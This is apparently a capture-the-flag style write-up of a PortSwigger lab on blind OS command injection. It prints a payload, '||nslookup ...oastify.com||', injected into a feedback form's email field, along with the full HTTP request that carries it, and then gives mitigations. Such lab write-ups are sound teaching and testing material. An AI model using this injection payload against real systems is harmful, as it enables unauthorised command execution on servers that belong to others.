
# 💻 Blind OS Command Injection – Out-of-Band (OOB) Interaction

> 🧠 **Level**: Practitioner  
> 🌐 **Platform**: PortSwigger Web Security Academy  
> 👩‍💻 **Author**: Kaouthar Belkebir  
> 📆 **Challenge Day**: XX — Pentest Challenge  

---

## 🧩 Lab Description

This lab is vulnerable to **blind OS command injection**.  
It does not return output directly, but we can confirm code execution by triggering an **external interaction** (DNS request) through an attacker-controlled domain.

🎯 **Objective**:  
Exploit the feedback form to trigger a **DNS lookup** using `nslookup`, confirming that arbitrary commands are being executed server-side.

---

## 🧪 Exploitation Strategy

We inject a payload in the `email` field using the `||` operator and the `nslookup` command. This forces the server to resolve a domain we control.

### ✅ Confirming Execution:
When the injected command is executed, the server sends a DNS query to our listener (via [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [OASTify](https://oastify.com)) — proving the injection worked.

---

## 🧠 Payload Used

```bash
||nslookup knboz2zho2fiavi6ozvjdr4phgn7byzn.oastify.com||
````

📝 This payload was injected in the `email` field of the feedback form.

---

## 📥 Full HTTP Request

```http
POST /feedback/submit HTTP/2
Host: 0a62007104e6f079838356e400f500f3.web-security-academy.net
Cookie: session=fXswci9zJWC3YE5TIZxpcWdVN6hu4T9J
Content-Type: application/x-www-form-urlencoded

csrf=bEZxAEYy843gXvC0zSwroABQUmqUKmNU&
name=helio&
email=hack@gamil.com||nslookup knboz2zho2fiavi6ozvjdr4phgn7byzn.oastify.com||&
subject=hackeme&
message=hackinggg-dns
```

---

## 🧬 Why This Works

The server concatenates the `email` input into a shell command. Since the input is not sanitized, the `||` operator allows us to **chain and execute arbitrary commands**.

`nslookup` sends a DNS request to our controlled domain, which we can observe.

---

## 📸 Screenshot (Proof of Concept)

![OOB Interaction Confirmed](https://github.com/Kabilala/OS-command-injection/blob/main/lab4/lab4.png

📍 The screenshot shows the DNS request received by `portswigguer`, confirming execution.

---

## 🛡️ Mitigation Techniques

* ✅ Avoid shell invocation with unsanitized user input
* ✅ Use safe APIs (`execFile`, parameterized commands)
* ✅ Implement strict input validation and allow-lists
* ✅ Monitor for unusual outbound traffic (like OOB DNS queries)

---

## 🔚 Conclusion

This lab demonstrates how **blind OS command injection** can still be detected and exploited using **out-of-band interactions**.
OOB payloads are crucial when there’s **no direct feedback** from the application.

---

### 📂 Repo Structure

```
.
├── README.md
├── images/
│   └── lab4-oob-confirmed.png
```


```
